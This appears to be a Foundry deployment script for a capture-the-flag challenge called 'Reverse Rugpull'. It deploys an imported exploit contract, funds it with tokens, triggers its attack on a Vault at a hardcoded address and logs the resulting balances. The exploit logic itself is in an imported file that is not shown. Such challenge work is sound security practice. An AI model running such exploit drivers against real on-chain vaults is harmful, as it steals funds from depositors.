// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Reverse Rugpull/src/ex.sol";
import {MintableERC20} from "../src/Reverse Rugpull/src/MintableERC20.sol";

contract rev_rugpull is Script {
    MintableERC20 token = MintableERC20(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);

    function setUp() public {

    }
    function run() public {
        vm.startBroadcast();

        exploit attacker = new exploit();
        Vault target = Vault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);
        token.transfer(address(attacker), 9 ether);
        attacker.ex();
        console.log("vault:totalshare:", target.totalShares());
        console.log("balanceOf vault:", token.balanceOf(address(target)));
        console.log("balanceOf attacker:", token.balanceOf(address(attacker)));

        vm.stopBroadcast();
    }
}